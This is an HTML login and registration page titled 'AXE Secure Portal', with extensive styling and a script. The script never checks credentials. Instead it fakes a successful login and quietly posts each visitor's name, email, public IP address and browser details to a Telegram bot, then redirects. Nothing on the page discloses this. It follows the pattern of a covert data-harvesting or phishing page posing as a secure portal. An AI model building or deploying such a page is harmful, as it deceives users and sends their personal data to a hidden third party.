<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê AXE Secure  Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3a0ca3;
            --secondary: #7209b7;
            --accent: #f72585;
            --dark: #212529;
            --light: #f8f9fa;
            --gray: #6c757d;
            --light-gray: #e9ecef;
            --success: #4cc9f0;
            --warning: #f8961e;
            --danger: #ef233c;
            --sidebar-width: 280px;
            --header-height: 70px;
            --transition: all 0.3s ease;
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.2);
            --radius: 10px;
            --radius-lg: 16px;
            --glow: 0 0 20px rgba(67, 97, 238, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0524, #1a0933);
            color: var(--light);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Particles Background */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            animation: float linear infinite;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }

        /* Auth Container */
        .auth-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .auth-box {
            background: rgba(15, 5, 36, 0.8);
            backdrop-filter: blur(10px);
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-lg), inset 0 0 15px rgba(114, 9, 183, 0.3);
            border: 1px solid rgba(114, 9, 183, 0.2);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            position: relative;
            overflow: hidden;
        }

        .auth-box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(to bottom right, transparent 0%, rgba(114, 9, 183, 0.1) 50%, transparent 100%);
            transform: rotate(30deg);
            animation: shine 8s infinite;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) rotate(30deg); }
            100% { transform: translateX(100%) rotate(30deg); }
        }

        .auth-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 50%;
            margin-bottom: 15px;
            box-shadow: var(--glow);
            border: 3px solid rgba(255, 255, 255, 0.2);
        }

        .logo img {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }

        .auth-header h1 {
            font-size: 2rem;
            margin-bottom: 5px;
            background: linear-gradient(to right, #FFA500, #FF4500);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .auth-header p {
            color: var(--light-gray);
            opacity: 0.8;
        }

        /* Tabs */
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(114, 9, 183, 0.3);
        }

        .tab-btn {
            flex: 1;
            padding: 12px;
            background: transparent;
            border: none;
            color: var(--light-gray);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
        }

        .tab-btn.active {
            color: var(--primary);
        }

        .tab-btn.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 100%;
            height: 3px;
            background: var(--primary);
            border-radius: 3px 3px 0 0;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Forms */
        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--light-gray);
        }

        input, textarea {
            width: 100%;
            padding: 12px 15px;
            background: rgba(15, 5, 36, 0.7);
            border: 1px solid var(--primary);
            border-radius: var(--radius);
            color: var(--light);
            font-size: 0.95rem;
            transition: var(--transition);
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(247, 37, 133, 0.2);
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #FFA500, #FF4500);
            color: white;
            border: none;
            border-radius: var(--radius);
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            margin-top: 10px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-lg);
        }

        /* AXE Logo */
        .axe-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            display: flex;
            align-items: center;
            z-index: 100;
        }

        .axe-logo img {
            height: 40px;
            margin-right: 10px;
        }

        .axe-logo-text {
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(to right, #FFA500, #FF4500);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        /* Status Message */
        .status-message {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px);
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 12px 25px;
            border-radius: 50px;
            box-shadow: var(--shadow-lg);
            z-index: 1000;
            display: flex;
            align-items: center;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .status-message.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .status-message i {
            margin-right: 10px;
        }

        @media (max-width: 768px) {
            .auth-box {
                padding: 20px;
            }
            
            .axe-logo {
                top: 10px;
                left: 10px;
            }
            
            .axe-logo img {
                height: 30px;
            }
            
            .axe-logo-text {
                font-size: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <!-- Particles Background -->
    <div class="particles" id="particles"></div>

    <!-- AXE Logo -->
    <div class="axe-logo">
        <img src="logo.png" alt="AXE Logo">
        
    </div>

    <!-- Status Message -->
    <div class="status-message" id="status-message">
        <i class="fas fa-check-circle"></i>
        <span id="status-text">Operation successful!</span>
    </div>

    <!-- Auth Container (Visible by default) -->
    <div class="auth-container" id="auth-container">
        <div class="auth-box">
            <div class="auth-header">
                <div class="logo">
                    <img src="https://i.imgur.com/JqYeZZn.png" alt="AXE Logo">
                </div>
                <h1></h1>
                <p>Access your account to continue</p>
            </div>

            <div class="tabs">
                <button class="tab-btn active" onclick="openTab('login')">Login</button>
                <button class="tab-btn" onclick="openTab('register')">Register</button>
            </div>

            <div id="login" class="tab-content active">
                <form id="loginForm">
                    <div class="form-group">
                        <label for="login-email"><i class="fas fa-envelope"></i> Email</label>
                        <input type="email" id="login-email" required>
                    </div>
                    <div class="form-group">
                        <label for="login-password"><i class="fas fa-key"></i> Password</label>
                        <input type="password" id="login-password" required>
                    </div>
                    <button type="submit" class="btn">
                        <i class="fas fa-sign-in-alt"></i> Login
                    </button>
                </form>
            </div>

            <div id="register" class="tab-content">
                <form id="registerForm">
                    <div class="form-group">
                        <label for="reg-name"><i class="fas fa-user"></i> Full Name</label>
                        <input type="text" id="reg-name" required>
                    </div>
                    <div class="form-group">
                        <label for="reg-email"><i class="fas fa-envelope"></i> Email</label>
                        <input type="email" id="reg-email" required>
                    </div>
                    <div class="form-group">
                        <label for="reg-password"><i class="fas fa-key"></i> Password</label>
                        <input type="password" id="reg-password" required>
                    </div>
                    <button type="submit" class="btn">
                        <i class="fas fa-user-plus"></i> Register
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Tab switching
        function openTab(tabName) {
            const tabContents = document.getElementsByClassName('tab-content');
            const tabButtons = document.getElementsByClassName('tab-btn');
            
            for (let i = 0; i < tabContents.length; i++) {
                tabContents[i].classList.remove('active');
                tabButtons[i].classList.remove('active');
            }
            
            document.getElementById(tabName).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        // Show status message
        function showStatus(message, isSuccess = true) {
            const status = document.getElementById('status-message');
            const statusText = document.getElementById('status-text');
            
            statusText.textContent = message;
            status.className = isSuccess ? 'status-message show' : 'status-message show error';
            
            setTimeout(() => {
                status.classList.remove('show');
            }, 3000);
        }

        // Generate random user ID
        function generateUserId() {
            return 'AXE-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        }

        // Send data to Telegram bot
        async function sendToTelegram(data) {
            const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            
            const text = `üîî New AXE Login üîî
            
üìõ Name: ${data.name}
üìß Email: ${data.email}
üÜî User ID: ${data.userId}
üåê IP: ${data.ip || 'Unknown'}
üì± Device: ${navigator.userAgent}`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Get client IP (fallback method)
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return null;
            }
        }

        // Handle login form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('login-email').value;
            const password = document.getElementById('login-password').value;
            
            // Show loading state
            const btn = e.target.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
            btn.disabled = true;
            
            try {
                // In a real app, you would validate credentials with your backend
                // For demo, we'll simulate a successful login
                
                // Generate user data
                const userId = generateUserId();
                const name = email.split('@')[0];
                const ip = await getClientIP();
                
                // Create user object
                const user = {
                    name: name,
                    email: email,
                    userId: userId,
                    ip: ip
                };
                
                // Store user data in localStorage
                localStorage.setItem('axeUser', JSON.stringify(user));
                
                // Send to Telegram bot
                const telegramSuccess = await sendToTelegram(user);
                
                if (telegramSuccess) {
                    console.log('User data sent to Telegram');
                } else {
                    console.log('Failed to send to Telegram');
                }
                
                // Show success message
                showStatus('Login successful! Redirecting...');
                
                // Redirect to index.html after 2 seconds
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
                
            } catch (error) {
                console.error('Login error:', error);
                showStatus('Login failed. Please try again.', false);
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        });

        // Handle registration form submission
        document.getElementById('registerForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const name = document.getElementById('reg-name').value;
            const email = document.getElementById('reg-email').value;
            const password = document.getElementById('reg-password').value;
            
            // Show loading state
            const btn = e.target.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Registering...';
            btn.disabled = true;
            
            try {
                // In a real app, you would send this to your backend
                // For demo, we'll simulate a successful registration
                
                // Generate user data
                const userId = generateUserId();
                const ip = await getClientIP();
                
                // Create user object
                const user = {
                    name: name,
                    email: email,
                    userId: userId,
                    ip: ip
                };
                
                // Store user data in localStorage
                localStorage.setItem('axeUser', JSON.stringify(user));
                
                // Send to Telegram bot
                const telegramSuccess = await sendToTelegram(user);
                
                if (telegramSuccess) {
                    console.log('Registration data sent to Telegram');
                } else {
                    console.log('Failed to send to Telegram');
                }
                
                // Show success message
                showStatus('Registration successful! Redirecting...');
                
                // Redirect to index.html after 2 seconds
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
                
            } catch (error) {
                console.error('Registration error:', error);
                showStatus('Registration failed. Please try again.', false);
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        });

        // Create particles
        function createParticles() {
            const particles = document.getElementById('particles');
            const particleCount = 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random size between 2px and 6px
                const size = Math.random() * 4 + 2;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Random position
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                // Random animation duration between 10s and 30s
                const duration = Math.random() * 20 + 10;
                particle.style.animationDuration = `${duration}s`;
                
                // Random delay
                particle.style.animationDelay = `${Math.random() * 5}s`;
                
                particles.appendChild(particle);
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
        });
    </s
